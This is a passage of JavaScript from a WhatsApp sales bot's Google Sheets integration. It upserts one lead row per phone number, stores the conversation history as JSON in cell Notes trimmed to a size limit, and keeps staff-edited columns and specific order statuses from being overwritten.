// from this format, JSON from an even older run, or legacy free text — this
// normalizes all three into a plain {role, content}[] to append new turns to.
function parseExistingHistoryEntries(noteText) {
  if (!noteText) return [];
  try {
    const parsed = JSON.parse(noteText);
    return Array.isArray(parsed) ? parsed : [];
  } catch (err) {
    return parseLegacyHistoryText(noteText);
  }
}

// Conversation History (column J, 0-indexed 9 — see the LEADS_HEADERS
// note above) used to hold the full, ever-growing chat transcript as the
// cell's VALUE — fine for a few turns, but it made rows balloon to dozens of
// lines tall over a long-running conversation and turned the sheet into a
// wall of text. Now the cell just shows a short indicator and the full
// transcript lives in the cell's Note (hover to read), keeping every row a
// single compact line while losing nothing — same data, same phone-based
// upsert/accumulation logic, just moved off the visible grid.
const CONVERSATION_HISTORY_COLUMN_INDEX = 9; // J
const HISTORY_INDICATOR_TEXT = '📄 View History';
// Google Sheets caps a cell Note at roughly 50,000 characters; stay well
// under that so a long-running conversation's note write never gets
// rejected outright — trim whole turns from the oldest end (never mid-object,
// which would produce invalid JSON) and keep the most recent (most
// operationally relevant, and most useful for training) messages.
const MAX_NOTE_LENGTH = 45000;

// String-based variant kept only for scripts/migrateHistoryToNotes.js, a
// one-time (already-applied, idempotent) migration of raw cell VALUES into
// Notes — predates the JSON-array format and operates on plain transcript
// strings, not {role, content} entries.
function truncateHistoryForNote(history) {
  if (history.length <= MAX_NOTE_LENGTH) return history;
  const marker = '...[سجل أقدم اتقطع للحفاظ على حجم الملاحظة]...\n';
  return marker + history.slice(history.length - (MAX_NOTE_LENGTH - marker.length));
}

function serializeHistoryEntries(entries) {
  let trimmed = entries;
  let serialized = JSON.stringify(trimmed);
  while (serialized.length > MAX_NOTE_LENGTH && trimmed.length > 1) {
    trimmed = trimmed.slice(1);
    serialized = JSON.stringify(trimmed);
  }
  if (trimmed.length < entries.length) {
    logger.warn(`Conversation History note exceeded ${MAX_NOTE_LENGTH} chars — dropped ${entries.length - trimmed.length} oldest turn(s).`);
  }
  return serialized;
}

// Sets (or replaces) the Note on the Conversation History cell for a given
// 1-based row number. `historyText` must already be final (e.g. the JSON
// string from serializeHistoryEntries, already truncated at the turn level)
// — this no longer truncates itself, since naively cutting mid-string would
// produce invalid JSON. Uses updateCells with fields:'note' specifically so
// it only ever touches the Note — never the cell's displayed value, which is
// written separately via the normal values.update/append calls in
// appendLead() below.
async function setConversationHistoryNote(rowNumber, historyText) {
  if (leadsSheetId === null) {
    logger.warn('Leads sheetId not resolved yet — skipping conversation-history note write this time (will retry on next message).');
    return;
  }
  await sheetsClient.spreadsheets.batchUpdate(
    {
      spreadsheetId: config.googleSheetId,
      requestBody: {
        requests: [
          {
            updateCells: {
              range: {
                sheetId: leadsSheetId,
                startRowIndex: rowNumber - 1,
                endRowIndex: rowNumber,
                startColumnIndex: CONVERSATION_HISTORY_COLUMN_INDEX,
                endColumnIndex: CONVERSATION_HISTORY_COLUMN_INDEX + 1,
              },
              rows: [{ values: [{ note: historyText }] }],
              fields: 'note',
            },
          },
        ],
      },
    },
    { timeout: REQUEST_TIMEOUT_MS }
  );
}

// Reads J's existing Note (previous conversation history, NOT its value —
// the value is just the indicator text) and K's current value (Follow-up
// Date, staff-owned, must round-trip unchanged) for a given 1-based row.
// spreadsheets.get (not values.get) is required here since values.get never
// returns Notes.
async function getExistingRowState(rowNumber) {
  // Two ranges in one call: H (Order Status — 2026-08-03, so appendLead can
  // decide whether to protect it, see GENERIC_ORDER_STATUSES) and J:L
  // (Conversation History's Note, Follow-up Date, and Staff Notes — all
  // three round-tripped unchanged the same way Follow-up Date always was).
  const result = await sheetsClient.spreadsheets.get(
    {
      spreadsheetId: config.googleSheetId,
      ranges: [`${LEADS_SHEET_NAME}!H${rowNumber}:H${rowNumber}`, `${LEADS_SHEET_NAME}!J${rowNumber}:L${rowNumber}`],
      fields: 'sheets.data.rowData.values(formattedValue,note)',
    },
    { timeout: REQUEST_TIMEOUT_MS }
  );
  const dataRanges = (result.data.sheets || [])[0]?.data || [];
  const statusCells = dataRanges[0]?.rowData?.[0]?.values || [];
  const cells = dataRanges[1]?.rowData?.[0]?.values || [];
  return {
    currentOrderStatus: (statusCells[0] && statusCells[0].formattedValue) || '',
    previousHistory: (cells[0] && cells[0].note) || '',
    followUpDate: (cells[1] && cells[1].formattedValue) || '',
    staffNotes: (cells[2] && cells[2].formattedValue) || '',
  };
}

function productToRow(product) {
  return [
    product.id || '',
    product.name || '',
    product.category || '',
    product.price || '',
    product.description || '',
    Array.isArray(product.benefits) ? product.benefits.join(', ') : '',
    Array.isArray(product.targetType) ? product.targetType.join(', ') : '',
    product.inStock === false ? 'FALSE' : 'TRUE',
  ];
}

async function ensureProductsTabSeeded() {
  try {
    await ensureHeaderRow(PRODUCTS_SHEET_NAME, PRODUCTS_HEADERS);

    const result = await sheetsClient.spreadsheets.values.get(
      { spreadsheetId: config.googleSheetId, range: `${PRODUCTS_SHEET_NAME}!A2:A2` },
      { timeout: REQUEST_TIMEOUT_MS }
    );
    const hasData = result.data.values && result.data.values.length > 0;
    if (hasData) return;

    if (!fs.existsSync(LOCAL_PRODUCTS_PATH)) return;
    const localProducts = JSON.parse(fs.readFileSync(LOCAL_PRODUCTS_PATH, 'utf-8'));
    if (!Array.isArray(localProducts) || localProducts.length === 0) return;

    const rows = localProducts.map(productToRow);
    await sheetsClient.spreadsheets.values.append(
      {
        spreadsheetId: config.googleSheetId,
        range: `${PRODUCTS_SHEET_NAME}!A:H`,
        valueInputOption: 'RAW',
        insertDataOption: 'INSERT_ROWS',
        requestBody: { values: rows },
      },
      { timeout: REQUEST_TIMEOUT_MS }
    );
    logger.success(`Seeded "Products" tab with ${rows.length} starter products from products.json.`);
  } catch (err) {
    logger.error('Could not seed "Products" tab with starter data.', err);
  }
}

// One row per phone number: updates the existing row (accumulating the full
// conversation into the Conversation History column) if this phone has
// written before, otherwise appends a new row and remembers it for next time.
async function appendLead(entry) {
  if (!enabled) {
    logger.warn('Google Sheets is not configured. Skipping lead log (WhatsApp bot continues normally).');
    return false;
  }

  const phone = entry.customerPhone;
  const newTurns = buildHistoryEntries(entry);

  // A..I — matches LEADS_HEADERS order exactly (Alternative Phone sits right
  // after the phone column, Delivery Address right before Order Status, per
  // the store owner's explicit layout request; Customer Message has no
  // column of its own anymore — still captured per-message in the
  // Conversation History note via buildHistoryEntries above).
  // sanitizeRowForSheet guards every field here in one place rather than
  // trusting a per-field judgment about which ones are "customer-controlled
  // today" — cheap, and immune to a future change elsewhere quietly making a
  // currently-safe field (e.g. productName) attacker-influenced. Order
  // Status (index 7) is built separately per-branch below — the existing-row
  // branch needs the sheet's current value first to decide whether to
  // protect it (see GENERIC_ORDER_STATUSES).
  function buildRow(orderStatus) {
    return sanitizeRowForSheet([
      new Date().toISOString(),
      entry.customerName || '',
      phone || '',
      entry.altPhone || '',
      entry.productName || '',
      entry.customerNeed || '',
      entry.deliveryAddress || '',
      orderStatus,
      entry.notes || '',
    ]);
  }

  const existingRow = phoneRowCache.get(phone);

  try {
    await runLimited('sheets', config.sheetsConcurrency, async () => {
      if (existingRow) {
        // Read H (Order Status), K (Follow-up Date), and L (Staff Notes —
        // all staff-owned or protected, must round-trip unchanged) and J's
        // existing Note (previous conversation history) so the update below
        // can't blank any of them out, and so the new line accumulates onto
        // the full history rather than replacing it.
        const { previousHistory, followUpDate, staffNotes, currentOrderStatus } = await sheetsCall(() => getExistingRowState(existingRow));
        const combinedTurns = [...parseExistingHistoryEntries(previousHistory), ...newTurns];

        // 2026-08-03 fix: resolveEarlyStageOrderStatus (sessionLogHelpers.js,
        // used for every ordinary conversation turn with no specific
        // order-related event) recomputes a generic Pending/In Progress
        // status fresh every single time, with no regard for what's already
        // on the sheet — silently regressing a more specific status (staff-
        // typed, e.g. "Delivered"/"Out for Delivery" from
        // formatLeadsSheet.js's dropdown, or the bot's own earlier
        // Completed/Cancelled/Needs Specialist/Issue) back to a generic
        // default the moment the same customer sends any further message.
        // Only the generic recompute needs guarding here — an explicit,
        // specific status the bot writes deliberately for a real event
        // always represents new information and should always win.
        const finalOrderStatus =
          GENERIC_ORDER_STATUSES.has(entry.orderStatus) && currentOrderStatus && !GENERIC_ORDER_STATUSES.has(currentOrderStatus)
            ? currentOrderStatus
            : entry.orderStatus || '';
        const row = buildRow(finalOrderStatus);

        await sheetsCall(() =>
          sheetsClient.spreadsheets.values.update(
            {
              spreadsheetId: config.googleSheetId,
              range: `${LEADS_SHEET_NAME}!A${existingRow}:L${existingRow}`,
              valueInputOption: 'USER_ENTERED',
              requestBody: { values: [[...row, HISTORY_INDICATOR_TEXT, followUpDate, staffNotes]] },
            },
            { timeout: REQUEST_TIMEOUT_MS }
          )
        );
        await sheetsCall(() => setConversationHistoryNote(existingRow, serializeHistoryEntries(combinedTurns)));
        logger.success(`Google Sheet row updated for ${phone} (status: ${finalOrderStatus}).`);
      } else {
        const row = buildRow(entry.orderStatus || '');
        const appendResult = await sheetsCall(() =>
          sheetsClient.spreadsheets.values.append(
            {
              spreadsheetId: config.googleSheetId,
              range: `${LEADS_SHEET_NAME}!A:L`,
              valueInputOption: 'USER_ENTERED',
              insertDataOption: 'INSERT_ROWS',
              requestBody: { values: [[...row, HISTORY_INDICATOR_TEXT, '', '']] },
            },
            { timeout: REQUEST_TIMEOUT_MS }
          )
        );
        const newRowNumber = extractRowNumber(appendResult.data.updates && appendResult.data.updates.updatedRange);
        if (newRowNumber) {
          phoneRowCache.set(phone, newRowNumber);
          await sheetsCall(() => setConversationHistoryNote(newRowNumber, serializeHistoryEntries(newTurns)));
        }
        logger.success(`Google Sheet log saved for ${phone} (status: ${entry.orderStatus}).`);
      }
    });
    recordSuccess();
    return true;
  } catch (err) {
    logger.error('Failed to write row to Google Sheet. WhatsApp bot continues normally.', err);
    return false;
  }
}

function isEnabled() {
  return enabled;
}

function getClient() {
  return enabled ? sheetsClient : null;
}

module.exports = {
  init,
  appendLead,
  logOrderHistory,
  getCustomerHistory,
  scanLeadsStatuses,
  updateOrderStatus,
  getCurrentOrderStatus,
  isEnabled,
  getClient,
  recordSuccess,
  getLastSuccessAt,
  isStale,
  startStalenessMonitor,
  PRODUCTS_SHEET_NAME,
  LEADS_SHEET_NAME,
  ORDER_HISTORY_SHEET_NAME,
  REQUEST_TIMEOUT_MS,
  CONVERSATION_HISTORY_COLUMN_INDEX,
  HISTORY_INDICATOR_TEXT,
  truncateHistoryForNote,
  buildHistoryEntries,
  parseExistingHistoryEntries,
  serializeHistoryEntries,
  sanitizeForSheetCell,
  sanitizeRowForSheet,
  TARGETED_CLIENTS_SHEET_NAME,
  OFFERS_CAMPAIGN_SHEET_NAME,
  CONFIRMED_ORDERS_SHEET_NAME,
  getOffersCampaignRows,
  clearOfferTestTrigger,
  setOfferLastTestSentAt,
  setLastCampaignTickAt,
  getTargetedClientsRows,
  upsertTargetedClient,
  appendConfirmedOrder,
  attachInvoiceLinks,
  getConfirmedOrderByRow,
  formatOffersCampaignTable,
  formatTargetedClientsTab,
  formatConfirmedOrdersTab,
};
